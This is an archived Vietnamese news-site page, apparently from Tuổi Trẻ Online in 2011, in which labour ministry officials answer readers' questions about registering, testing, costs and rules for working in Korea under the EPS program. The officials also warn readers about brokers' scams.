+<P class=pQuestion>* Hiện tôi có hộ khẩu ở Quảng Bình nhưng tôi ra Hà Tĩnh để học tiếng Hàn theo chương trình EPS. Vậy tôi phải đăng ký dự thi ở đâu và tôi có thể thi ở địa điểm thi nào? (Dương Thị Hiền, 25 tuổi, hiensunny@)</P></DIV>
+<DIV id=50379>
+<P class=pAnswer><STRONG>- Ông Lê Mạnh Hùng:</STRONG> Theo quy định tại công văn số 3753/LĐTBXH-QLLĐNN ngày 2-11-2011 của Bộ LĐTB&amp;XH thì người lao động đăng ký kiểm tra tiếng Hàn phải đang cư trú dài hạn tại địa phương hoặc là&nbsp;học sinh sinh viên&nbsp;đang học nghề, chuyên môn nghiệp vụ hệ dài hạn tại các trường đóng trên địa bàn. Vì vậy người lao động&nbsp;đang học tiếng Hàn&nbsp;tại địa phương này&nbsp;nhưng có hộ khẩu&nbsp;thường trú tại&nbsp;địa phương khác&nbsp;thì phải&nbsp;đăng ký kiểm tra tiếng Hàn tại sở LĐTBXH nơi người lao động có HKTT.</P>
+<P class=pAnswer>Trong trường hợp của bạn thì bạn phải đăng ký kiểm tra tiếng Hàn tại Sở LĐTBXH tỉnh Quảng Bình. </P>
+<P class=pAnswer></P></DIV>
+<DIV id=50457>
+<P class=pQuestion>* Xin được hỏi chương trình: 1. Làm thế nào để đăng ký dự tuyển đi lao động tại Hàn Quốc? 2. Mất bao nhiêu thời gian từ lúc đăng ký tới khi đi thi trình độ tiếng Hàn? Và bao lâu cho đến khi có giấy trúng tuyển?&nbsp;3. Chi phí cụ thể từ đăng ký đến thi tuyển và cho đến khi đi lao động kể cả vé máy bay trong trường hợp trúng tuyển? 4. Thời gian đăng ký là khi nào? Thời gian thi tiếng Hàn là khi nào? Có thường xuyên không? (Đặng Thế Miên, 23 tuổi, dt_mien@...).</P>
+<P class=pAnswer><STRONG>- Ông Phan Văn Minh:</STRONG> Người lao động muốn đăng ký tham dự kiểm tra tiếng Hàn vào ngày 17, 18-12-2011 thì liên hệ với Sở LĐTB&amp;XH nơi có hộ khẩu thường trú. Thời gian đăng ký từ ngày 11-11 đến ngày 14-11-2011. Nếu người lao động đạt yêu cầu qua kỳ kiểm tra tiếng Hàn ngày 17 và 18-12-2011 và đáp ứng đủ các điều kiện theo quy định của phía Hàn Quốc thì sẽ được làm hồ sơ đăng ký dự tuyển đi làm việc ở Hàn Quốc. </P>
+<P class=pAnswer>Hồ sơ đăng ký dự tuyển này sẽ được Trung tâm Lao động Ngoài nước nhập vào máy tính đưa lên mạng để giới thiệu cho chủ sử dụng Hàn Quốc lựa chọn. Đây là hồ sơ dự tuyển vì vậy người lao động có thể được lựa chọn hoặc không được lựa chọn, thời gian chờ đợi có thể dài tối đa là 2 năm (vì chứng chỉ tiếng Hàn chỉ có giá trị trong thời gian 2 năm). Thời gian kiểm tra tiếng Hàn phụ thuộc vào kế hoạch&nbsp;của Bộ Việc làm và Lao động Hàn Quốc.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50389>
+<P class=pQuestion>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width=200 align=right>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center>
+<P class=pQuestion><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>* Nếu làm ngành CN chế tạo thì lương sẽ bao nhiêu? Nhà ở, điện nước... do chủ sử dụng lao động cung cấp hay do mình tự thuê? Tăng ca sẽ được bao nhiêu won/giờ? Em nghe nói kỳ thi này rất khó, điểm trung bình mỗi môn phải từ 80 trở lên phải không? (pham ngoc hieu, 29t tuổi, nhatviet26@)</FONT></FONT></FONT></P>
+<P class=pBody><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>- <STRONG>Ông Nguyễn Như Tuấn</STRONG>:&nbsp;Về mức lương bạn có thể tham khảo thông tin ở những câu trả lời khác liên quan. </FONT></FONT></FONT></P>
+<P class=pBody><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>Theo quy định của Hàn Quốc, người lao động sẽ phải tự đảm nhiệm các chi phí về ăn ở. Tiền lương làm thêm giờ sẽ được tính trên cơ sở mức lương trả theo giờ nhân với hệ số như sau: 150% đối với giờ làm thêm ngoài giờ của ngày làm việc bình thường, 200% đối với giờ làm thêm của ngày nghỉ, ngày lễ.</FONT></FONT></FONT></P>
+<P class=pBody><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>Điểm tối đa là 200 điểm cho 50 câu hỏi (25 câu nghe hiểu và 25 câu đọc hiểu), phía Hàn Quốc sẽ lựa chọn người lao động theo thứ tự từ điểm cao nhất trở xuống cho đến khi đủ số lượng lao động theo yêu cầu. </FONT></FONT></FONT></P>
+<P class=pBody><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>Theo kinh nghiệm của tôi, <STRONG>nếu bạn học tiếng Hàn chăm chỉ từ 3 đến 6 tháng bạn có nhiều cơ hội để vượt qua kỳ thi này</STRONG>. </FONT></FONT></FONT></P></TD></TR></TBODY></TABLE>* Tôi&nbsp;tốt nghiệp&nbsp;ngành Cơ khí - hàn (hệ trung cấp) tại Trường ĐH Công nghiệp TP.HCM và đã đi làm đúng ngành ba năm nay. Xin hỏi với số lượng người đã học tiếng Hàn gần 60.000 mà chưa đi được thì khoảng bao lâu nữa tôi mới có cơ hội (vì tôi chưa học tiếng trong khi đợt này chỉ tuyển 15.000). Với bằng cấp như tôi nếu được tuyển thu nhập khoảng bao nhiêu? Xin cảm ơn. (LÊ HỒNG QUÂN, 23 tuổi, haily_le@)</P>
+<P class=pAnswer><STRONG>- Ông Nguyễn Như Tuấn:</STRONG> Chào bạn Lê Hồng Quân, việc lựa chọn và ký hợp đồng với người lao động nước ngoài sẽ tùy thuộc vào chủ sử dụng lao động Hàn Quốc. Đối với người lao động muốn đi làm việc tại Hàn Quốc theo chương trình cấp phép cho lao động nước ngoài (chương trình EPS), một trong những điều kiện cần thiết là phải vượt qua kỳ kiểm tra tiếng Hàn. Người lao động làm việc tại Hàn Quốc theo chương trình EPS trong lĩnh vực sản xuất chế tạo sẽ không có sự khác biệt về mức lương theo trình độ đào tạo. </P>
+<DIV id=50437>
+<P class=pQuestion>* Tôi đọc báo thấy có nói&nbsp;đến&nbsp;tình trạng lao động cư trú bất hợp pháp sau khi hết hợp đồng và bỏ trốn ngay khi nhập cảnh Hàn Quốc gia tăng, vậy Cục Quản lý lao động nước ngoài có những cảnh báo cho lao động về hậu quả họ phải chịu nếu vi phạm như vậy hay không? Tôi nghĩ nếu có cảnh báo, người lao động sẽ sợ mà không dám vi phạm. (Anh Quân, 25 tuổi)</P>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Chúng tôi thừa nhận trong thời gian vừa qua là hiện tượng lao động bỏ trốn ngay tại sân bay sau khi nhập cảnh tại Hàn Quốc, hoặc ở lại làm việc khi hết hợp đồng làm việc bất hợp pháp có gia tăng.&nbsp;Điều này đã ảnh hưởng rất nhiều đến hình ảnh lao động Việt Nam, uy tín lao động Việt Nam và ảnh hưởng trực tiếp đến hàng chục ngàn lao động VN có nhu cầu đang chờ đợi được đi làm việc tại HQ mà chưa được thi tiếng Hàn. </P>
+<P class=pAnswer>Về hành vi vi phạm này, phía Hàn Quốc quy định sẽ phạt người lao động nước ngoài bất hợp pháp 40.000 USD. Và tại VN, Chính phủ cũng có quy định xử phạt hành chính người lao động VN bỏ trốn, làm việc bất hợp pháp ở nước ngoài.</P>
+<P class=pAnswer>Về nguyên nhân của việc này có nhiều, nhưng phía cơ quan quản lý nhà nước tới đây sẽ tăng cường hơn nữa, kiểm tra chặt chẽ hơn nữa trong việc tuyển chọn, giáo dục định hướng cho lao động trước khi xuất cảnh. Bởi với hiện tượng lao động bỏ trốn gia tăng cũng như lao động hết hợp đồng ở lại làm&nbsp;việc ngày một nhiều sẽ gây ảnh hưởng rất lớn đến hình ảnh, uy tín lao động VN không chỉ ở thị trường Hàn Quốc mà cả các thị trường khác. </P>
+<P class=pAnswer>Tình trạng này gia tăng thì cơ hội đến Hàn Quốc làm việc của cả chục ngàn người có nhu cầu sẽ hẹp lại. Thậm chí phía Hàn Quốc có thể&nbsp;tạm dừng dài hạn các chương trình tiếp nhận lao động VN. Đó là những cảnh báo rất rõ ràng, mà mỗi người lao động cần phải nâng cao ý thức công dân, có trách nhiệm với bản thân, với cộng đồng người Việt.</P>
+<P class=pQuestion>* Nếu như số tiền để đi quá cao, vượt quá khả năng kinh tế của&nbsp;gia đình em, Nhà nước có chính sách nào cho những hoàn cảnh khó khăn như em không? (Nguyễn Thị Thanh Tuyền, 24 tuổi, Thanhtuyenphuyen@...)</P></DIV>
+<DIV id=50450>
+<P class=pAnswer><STRONG>- Ông Đào Công Hải:</STRONG> Hiện nay Chính phủ có rất nhiều chính sách ưu đãi về vốn cho người lao động nghèo có nhu cầu đi làm việc ở nước ngoài. Mọi chi phí trước khi đi, tùy theo từng thị trường thì mức chi phí được ghi rõ trong hợp đồng phái cử giữa bạn với doanh nghiệp phái cử lao động. Bạn sẽ được vay theo các mức chi phí đó, với lãi suất ưu đãi mà Chính phủ quy định tại Ngân hàng chính sách (nếu bạn là đối tượng chính sách), tại Ngân hàng NN&amp;PTNT và một số ngân hàng thương mại khác.</P>
+<P class=pAnswer>Để biết thêm chi tiết về các chính sách ưu đãi về vốn vay, bạn nên liên hệ trực tiếp với Sở LĐTB-XH tại địa phương để được hướng dẫn.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50378>
+<P class=pQuestion>* Tôi nghe có một thầy giáo dạy tiếng Hàn&nbsp;nói là chỉ cần mất 2.000 USD, không cần phải học tiếng Hàn mà vẫn đạt yêu cầu qua kỳ kiểm tra tiếng Hàn trong tháng 12 tới. Cho tôi hỏi thầy có làm được điều đó không?&nbsp;(annguyen@....)</P></DIV>
+<DIV id=50350>
+<P class=pAnswer>- <STRONG>Ông Phan Văn Minh</STRONG>: Tôi xin khẳng định đó là thông tin lừa đảo. Bởi vì kỳ kiểm tra tiếng Hàn sắp tới do Bộ Việc làm và Lao động Hàn Quốc chủ trì phối hợp với Bộ LĐTBXH Việt Nam tổ chức. Đề thi tiếng Hàn do phía HQ mang từ HQ sang và được bảo mật tuyệt đối đến giờ thi. Trong mỗi phòng thi có hai cán bộ coi thi, các cán bộ coi thi này chịu sự giám sát trực tiếp của phía HQ.</P>
+<P class=pAnswer>Đối với thí sinh, không được mang điện thoại di động hoặc các thiết bị điện tử nhận tin nhắn vào phòng thi. Nếu bị phát hiện mang các thiết bị này vào phòng thi, dù chưa sử dụng vẫn bị coi là vi phạm quy chế thi. Bài thi của thí sinh đó sẽ bị hủy và sẽ bị cấm tham dự các kỳ thi tiếng Hàn trong thời gian hai năm. Đồng thời Bộ LĐTBXH cũng đề nghị các cơ quan chức năng của Bộ Công an phối hợp để ngăn chặn và xử lý các hành vi vi phạm quy chế thi. Kết thúc thi, toàn bộ bài thi của các thí sinh sẽ được chuyển về HQ để chấm bằng máy. Vì vậy không thể có sự can thiệp của bất cứ ai vào quá trình chấm thi.</P>
+<P class=pAnswer>Chúng tôi khuyên các bạn không nên tin và làm theo những lời dụ dỗ như trên. Các bạn nên tập trung ôn tập tiếng Hàn tốt để đạt được kết quả cao nhất trong kỳ kiểm tra tiếng Hàn sắp tới.&nbsp;</P>
+<P class=pAnswer>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width="95%" align=center>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>
+<P class=pQuestion>* Mình có thể qua Hàn Quốc và làm việc bao lâu ở bên đó? Có thể làm được lâu năm ở bên đó không? (Phan Thanh Huu, 24 tuổi, phanthanhhuu@)</P>
+<P class=pAnswer><FONT size=3 face="Times New Roman"><STRONG>- </STRONG><FONT size=2 face=Arial><STRONG>Ông Đào Công Hải:</STRONG> Hiện nay, sang Hàn Quốc làm việc có những chương trình như sau: </FONT></FONT></P>
+<P class=pAnswer>1. Chương trình EPS được hai Chính phủ thực hiện, phía Hàn Quốc là Bộ Lao động việc làm và phía VN&nbsp;là Bộ LĐTB-XH. Trung tâm lao động ngoài nước được Bộ LĐTB-XH ủy quyền thực hiện chương trình này. Nếu bạn tham gia lao động phổ thông thì qua chương trình này. Thời gian tối đa của chương trình này là 4 năm 10 tháng.</P>
+<P class=pAnswer>2. Chương trình thẻ vàng: Phía HQ cần các chuyên gia làm việc ở các lĩnh vực CNTT, Điện, Điện cơ, Vật liệu mới, Công nghệ nano...Nếu bạn đủ yêu cầu về ngoại ngữ (tiếng Anh), có từ ba năm kinh nghiệm chuyên ngành thì bạn có thể đăng ký để tham gia làm việc tại HQ. Thời gian làm việc phụ thuộc vào phía chủ sử dụng làm việc, nhưng tối thiểu từ 3 năm đến 6 năm.</P>
+<P class=pAnswer>3. Chương trình ngư nghiệp: Hiệp hội Thủy sản HQ phối hợp với 5 doanh nghiệp XKLĐ của VN tuyển lao động trong lĩnh vực ngư nghiệp sang HQ làm việc trong lĩnh vực ngư nghiệp. Lao động từ VN phải có kinh nghiệm đi biển và làm các công việc liên quan đến đánh bắt cá, làm việc trên biển. Thời gian làm việc cũng tối đa là 4 năm 10 tháng.</P></FONT></FONT></FONT></TD></TR></TBODY></TABLE></P></DIV>
+<DIV id=50447>
+<P class=pQuestion>*Em muốn hỏi bây giờ em đăng ký đi lao động Hàn Quốc thì em đi theo diện tu nghiệp sinh hay thực tập sinh.&nbsp;Bây giờ em đang sống ở Bình Định&nbsp;thì đăng ký ở đâu, nếu em đăng ký và em học tiếng Hàn Quốc và thi có kết quả tiếng Hàn (trường hợp đạt điểm yêu cầu) thì mất khoảng thời gian bao lâu được xuất cảnh. Thời hạn tối đa em được làm việc ở Hàn Quốc là bao nhiêu năm?&nbsp;(Lê Tấn Đạt, 21 tuổi, trailangchai_dat@...)</P>
+<P class=pAnswer>- <STRONG>Ông Đào Công Hải</STRONG>: Chương trình Tu nghiệp sinh tại HQ không còn nữa, mà chỉ còn chương trình phái cử lao động EPS. Bạn ở Bình Định và nếu có nhu cầu đi làm việc tại Hàn Quốc thì nên liên hệ trực tiếp với Sở LĐTB-XH tỉnh Bình Định. </P>
+<P class=pAnswer>Khi thi tiếng Hàn đạt yêu cầu thì hồ sơ của bạn được chuyển sang Hàn Quốc. Và việc chọn lựa là hoàn toàn do phía Hàn Quốc, nên không thể biết thời gian bạn được chọn là bao lâu. Chứng chỉ thi tiếng Hàn có giá trị 2 năm, còn hồ sơ gửi lên mạng cho phía Hàn Quốc chỉ có giá trị một năm. </P>
+<P class=pAnswer>Sau một năm gửi hồ sơ mà bạn chưa được phía Hàn Quốc chọn thì nếu bạn vẫn còn nhu cầu thì bạn nên báo lại cho Sở LĐTB-XH hoặc Trung tâm lao động ngoài nước để các đơn vị này giới thiệu lại cho bạn.</P></DIV>
+<DIV id=50381>
+<P class=pQuestion>* Tôi xin hỏi vài điều: 1. Hàn Quốc có tuyển điều dưỡng viên&nbsp;qua làm việc không? Nếu có thì thủ tục cần những gì? 2. Tôi ở tỉnh vào Sài Gòn làm việc, giờ&nbsp; muốn đăng ký để làm thủ tục đi lao động ở Hàn Quốc thì đăng ký&nbsp;ở đâu? (nguyễn sỹ nguyên, 28 tuổi, fantasy_xf4@...)</P></DIV>
+<DIV id=50456>
+<P class=pAnswer>- <STRONG>Ông Đào Công Hải</STRONG>: Xin chào bạn và tôi trả lời luôn là Hàn Quốc không tiếp nhận điều dưỡng viên từ VN. Còn việc bạn có nhu cầu&nbsp;sang làm việc tại Hàn Quốc thì bạn nên đến Sở LĐTB-XH nơi bạn cư trú để được tư vấn, hướng dẫn. Nhưng có một điều kiện bắt buộc khi bạn muốn sang Hàn Quốc làm việc trong khuôn khổ chương trình cấp phép EPS thì bạn phải vượt qua kỳ kiểm tra tiếng Hàn. </P>
+<P class=pAnswer>Hơn nữa bạn đang là điều dưỡng viên, nên nếu bạn muốn sang Hàn Quốc làm việc thì bạn&nbsp;nên nhanh chóng bổ túc tay nghề trong lĩnh vực sản xuất chế tạo.</P>
+<P class=pAnswer></P></DIV>
+<DIV id=50380>
+<P class=pQuestion>* Em rất muốn đi Hàn Quốc nhưng gia đình lại không đủ khả năng. Em cũng đã học qua tiếng Hàn Quốc. Mong muốn của em là được qua Hàn Quốc sinh sống và làm việc. Vậy em xin hỏi qua đó em sẽ làm gì? Chi phí&nbsp;là&nbsp;bao nhiêu? Có cách nào để em có thể qua&nbsp;Hàn Quốc&nbsp;không? Rất mong nhận được hồi âm(Nguyễn Văn Chung, 22 tuổi, nguyenvanchung@)</P>
+<P class=pAnswer>- <STRONG>Ông Phan Văn Minh</STRONG>: Nếu&nbsp;bạn có nguyện vọng sang làm việc tại Hàn Quốc thì phải thực hiện các bước sau:</P>
+<P class=pAnswer>+ Phải kiểm tra sức khỏe, nếu đủ điều kiện sức khỏe đi làm việc nước ngoài thì phải học tiếng Hàn để đủ trình độ tham dự kỳ kiểm tra tiếng Hàn theo quy định của Hàn Quốc.</P>
+<P class=pAnswer>+ Tham dự kỳ kiểm tra tiếng Hàn do Bộ LĐTB&amp;XH Việt Nam&nbsp;phối hợp với Bộ Việc làm&nbsp;và Lao&nbsp;động Hàn Quốc tổ chức và&nbsp;đạt yêu cầu về tiếng Hàn theo quy định của&nbsp;phía Hàn Quốc đồng thời đáp ứng các điều kiện sau đây: Đủ 18 tuổi đến dưới 39 tuổi; không có tiền án; không bị cấm xuất cảnh Việt Nam; không bị cấm nhập cảnh Hàn Quốc.</P>
+<P class=pAnswer>+ Có hồ sơ đăng ký dự tuyển đi làm việc tại Hàn Quốc thông qua Trung tâm Lao động ngoài nước, Bộ LĐTB&amp;XH Việt Nam để giới thiệu cho chủ sử dụng Hàn Quốc lựa chọn. Nếu được lựa chọn, bạn sẽ được làm thủ tục xuất cảnh đi làm việc tại Hàn Quốc.</P>
+<P class=pAnswer>+ Chi phí để đi làm việc tại Hàn Quốc theo chương trình EPS bao gồm: 630 USD (trong đó tiền vé máy bay là 350 USD, lệ phí visa là 50 USD, 230 USD là chi phí cho việc tuyển chọn, xử lý hồ sơ và phục vụ công tác quản lý trong thời gian người lao động làm việc ở nước ngoài); khi người lao động xuất cảnh phải mang theo 500 USD sang Hàn Quốc để mua bảo hiểm hồi hương và bảo hiểm rủi ro; người lao động phải nộp 100.000 VNĐ&nbsp;để tham gia quỹ hỗ trợ việc làm ngoài nước; 300.000 VNĐ&nbsp;tiền trang phục xuất cảnh.</P>
+<DIV id=50466>
+<P class=pQuestion>* Tôi đã đi xuất khẩu lao động ở Hàn Quốc&nbsp;từ năm 1999,&nbsp;khi hết hợp đồng tôi đã ra ngoài làm việc bất hợp pháp. Sau đó, tôi đã tự nguyện về nước. Tôi xin hỏi: tôi muốn đăng ký đi lại thì có được không? Nếu được thì hộ khẩu của tôi hiện ở Thái Bình, nhưng tôi đang tạm trú dài hạn ở Bình Dương, tôi có thể đăng ký như thế nào và ở đâu? Xin chân thành cám ơn. (Phạm Văn Đăng, 32 tuổi, thanhxpham@...)</P>
+<P class=pAnswer>- <STRONG>Ông Đào Công Hải</STRONG>: Theo quy định của phía Hàn Quốc, những người lao động nước ngoài cư trú bất hợp pháp tại HQ sẽ bị cấm nhập cảnh vào HQ trong vòng 5 năm kể từ ngày bị trục xuất.&nbsp;Trên thực tế, bạn đã từng cư trú bất hợp pháp tại Hàn Quốc và như thế là bạn đã nằm trong "danh sách đen" của Bộ Tư pháp Hàn Quốc. Và phía Hàn Quốc không khuyến khích việc cấp visa nhập cảnh cho những người trong "danh sách đen". Vì vậy bạn nên cân nhắc việc đăng ký để đi làm việc tại Hàn Quốc. </P>
+<DIV id=50358>
+<P class=pQuestion>*&nbsp;Em đã đỗ kỳ kiểm tra tiếng Hàn ngày 17-10-2010 và đã nộp hồ sơ về Trung tâm LĐ Ngoài nước nhưng đến nay&nbsp;vẫn chưa thấy được gọi đi học định hướng như các bạn ở trong xã em.&nbsp;Em rất sốt ruột vì đã nghỉ làm một năm nay để chờ đi. Có người nói muốn được đi thì phải nộp 6.000 USD, cho em hỏi có đúng không?</P>
+<P class=pAnswer>- <STRONG>Ông Phan Văn Minh</STRONG>: Tôi xin khẳng định đây là một hành vi lừa đảo của các đối tượng cò mồi. Bởi vì theo quy định của phía Hàn Quốc, người LĐ sau khi đạt yêu cầu về tiếng Hàn và đáp ứng đủ các điều kiện theo quy định của phía HQ thì được làm hồ sơ đăng ký dự tuyển đi làm việc tại HQ theo chương trình EPS. </P>
+<P class=pAnswer>Hồ sơ dự tuyển này của người LĐ được sở LĐTB&amp;XH hoặc Cục Kinh tế (Bộ Quốc phòng) gửi về TT LĐNN&nbsp;để&nbsp;kiểm tra. </P>
+<P class=pAnswer>Những hồ sơ hợp lệ sẽ được nhập vào máy tính, gửi sang Cơ quan phát triển nguồn nhân lực HQ để giới thiệu cho chủ sử dụng&nbsp;HQ lựa chọn.&nbsp;Đây là hồ sơ&nbsp;đăng ký dự tuyển,&nbsp;việc người LĐ&nbsp;được chủ sử dụng&nbsp;lựa chọn là&nbsp;theo nguyên tắc ngẫu nhiên. Khi chủ sử dụng yêu cầu tuyển chọn một LĐ theo tiêu chí của họ thì hệ thống máy tính sẽ giới thiệu từ 3 đến 5 ứng viên đáp ứng yêu cầu đó để chủ sử dụng LĐ lựa chọn. Chủ sử dụng LĐ không biết danh tính của những người LĐ đó. </P>
+<P class=pAnswer>Không một cá nhân, tổ chức nào có thể can thiệp vào quá trình này. Vì vậy người LĐ phải hết sức cảnh giác, không&nbsp;được nôn nóng, nhẹ dạ cả tin vào những lời dụ dỗ của các đối tượng cò mồi.</P>
+<DIV id=50541>
+<P class=pQuestion>* Kính đề nghị quý cấp giải thích rõ cụm từ "Đang cư trú dài hạn tại địa phương" trong Công văn của Bộ Lao động Thương binh và Xã hội về điều kiện để người lao động được tham dự kiểm tra tiếng Hàn là như thế nào? Xin chân thành cảm ơn!(Lê Minh Tuấn, 25 tuổi, volantuan@...).</P>
+<P class=pAnswer>- <STRONG>Ông Phan Văn Minh</STRONG>: "Đang cư trú dài hạn tại địa phương" nghĩa là trước&nbsp;hết bạn phải có hộ khẩu thường trú và đang sinh sống, làm việc tại địa phương đó. Nếu bạn chuyển hộ khẩu từ địa phương khác tới nhưng không sinh sống và làm việc ở đó mà&nbsp;mục đích chuyển hộ khẩu đến đó để đăng ký dự tuyển đi làm việc&nbsp;tại Hàn Quốc thì không hợp lệ.</P>
+<P class=pAnswer>
+<TABLE style="BORDER-COLLAPSE: separate" border=0 cellSpacing=5 borderColor=#ecf2fe borderColorLight=#4792d9 borderColorDark=#456ae1 cellPadding=5 width="95%" align=center>
+<TBODY>
+<TR>
+<TD bgColor=#cfe6f9 vAlign=center>
+<P class=pBody><FONT color=#686868><FONT color=#fafafa><FONT color=#030303>Buổi giao lưu&nbsp;diễn ra từ 8g30-11g30 ngày 10-11 trên <EM>Tuổi Trẻ Online</EM> (tuoitre.vn, TTO)&nbsp;đã giải đáp chi tiết, cụ thể những thắc mắc liên quan đến những ưu đãi dành cho người lao động nghèo khi xuất khẩu lao động Hàn Quốc; làm sao tránh tình trạng "cò" lao động; thủ tục kiểm tra điểm dự thi và cách để biết hồ sơ thi đậu được phía Hàn Quốc chọn; hợp đồng làm việc bao nhiêu năm, có được gia hạn thêm; lương tối thiểu và làm thêm ngoài giờ…</FONT></FONT></FONT></P>
+<P class=pBody><FONT color=#030303><EM>Tuổi Trẻ Online</EM> chân thành cảm ơn quý khách mời đã tham gia buổi giao lưu cũng như bạn đọc đã nhiệt tình gửi câu hỏi giao lưu.</FONT></P>
+<P class=pBody><FONT color=#030303>Hẹn gặp lại trong một chương trình trực tuyến khác do <EM>Tuổi Trẻ Online</EM> tổ chức sắp tới.</FONT></P></TD></TR></TBODY></TABLE></P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
+<P class=pAuthor>TTO</P></div>
+
+						<p align="center">
+						<A href="JavaScript:location.href='PrintView.aspx'+location.search">
+							<IMG src="images/print.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="?RefID=464128&amp;ContactID=">
+							<IMG src="images/response.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="JavaScript:onResponseClick();">
+							<IMG src="images/email.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="#top">
+							<IMG src="images/top.gif" border="0"></A>
+						</p>
+	  </td>
+  </tr>
+  
+				<tr height="10">
+					<td></td>
+				</tr>
+				<tr height="1">
+					<td  style="background-image:url(images/Article.gif); background-repeat:repeat-x; margin-top:10"></td>
+				</tr>
+				<tr height="10">
+					<td></td>
+				</tr>
+				
+				
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463967&ChannelID=269' title='TTO - Nhằm giúp các ứng viên&nbsp;có thể trình bày một hồ sơ xin việc (CV) thật ấn tượng, Tuổi Trẻ Online cùng mạng tuyển dụng kiemviec.com đồng tổ chức buổi tư vấn offline với chủ đề "Hồ sơ ứng tuyển ấn tượng".'>
+									Mời tham gia buổi tư vấn “Hồ sơ ứng tuyển ấn tượng”&nbsp; - (10/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=461033&ChannelID=269' title='TTO - *&nbsp;Tôi tốt nghiệp cử nhân Anh, đã có kinh nghiệm báo cáo thuế và các công việc của tổ chức sự kiện, nhưng&nbsp;tôi không đảm nhận khâu tìm khách hàng cũng như lên kế hoạch, ý tưởng chào hàng đối tác.'>
+									Yêu cầu của vị trí trưởng phòng tổ chức sự kiện? - (09/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=464219&ChannelID=269' title='TT&nbsp;- Cục Quản lý lao động ngoài nước vừa quyết định xử phạt vi phạm hành chính đối với chín công ty vi phạm Luật người lao động VN đi làm việc ở nước ngoài.'>
+									Xử phạt 9 công ty xuất khẩu lao động - (09/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463986&ChannelID=269' title='TT - Trong hai ngày 6 và 7-11, gần 10.000 học sinh, sinh viên trên địa bàn TP.HCM đã tham gia “Hội chợ việc làm lần 9” năm 2011 tại Trường đại học Công nghiệp TP.HCM. 13 doanh nghiệp tư vấn, giới thiệu việc làm đã giới thiệu hàng ngàn đầu việc.'>
+									Ngày hội việc làm cho 10.000 bạn trẻ - (08/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463987&ChannelID=269' title='TT - Công ty TNHH một thành viên dịch vụ dầu khí Sài Gòn Nhân Lực đang có đơn hàng tuyển dụng lao động đi làm công nhân may tại hai thị trường Nhật Bản và Liên bang Nga.'>
+									Đi làm thợ may ở Nhật và Nga lương cao - (08/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463989&ChannelID=269' title='TT - Trước kỳ thi tiếng Hàn lần 9 được tổ chức vào ngày 17 và 18-12-2011 để tuyển chọn lao động đi làm việc ở Hàn Quốc, Bộ Lao động - thương binh và xã hội đã có công văn gửi một số địa phương đề nghị tạm thời chưa tiếp nhận hồ sơ kiểm tra tiếng Hàn của những người lao động từ các xã, phường có từ năm lao động cư trú bất hợp pháp tại Hàn Quốc và những xã, phường có lao động bỏ trốn ngay khi nhập cảnh Hàn Quốc.'>
+									Người lao động 23 xã, phường tạm thời không được thi tiếng Hàn - (08/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=461030&ChannelID=269' title='TTO - * Tôi là sinh viên năm 4 ngành sinh học thuộc ĐH Khoa học tự nhiên, chuyên ngành về sinh lý động vật và phương pháp, kỹ thuật mới trong y sinh học như tế bào gốc, thụ tinh trong ống nghiệm.'>
+									Cơ hội việc làm cho sinh viên ngành y&nbsp;sinh học? - (07/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463700&ChannelID=269' title='TTO - Tuần 4 (24 đến 30-10-2011), chất lượng hồ sơ dự thi được đánh giá là vượt trội hơn hẳn. Thậm chí, có hai hồ sơ được lọt vào vòng xét chọn hồ sơ ấn tượng nhất tuần, và kết quả chỉ được phân định vào phút chót.'>
+									Hồ sơ ấn tượng&nbsp;nhất tuần 4:&nbsp;vị trí trưởng nhóm quản lý chất lượng - (05/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
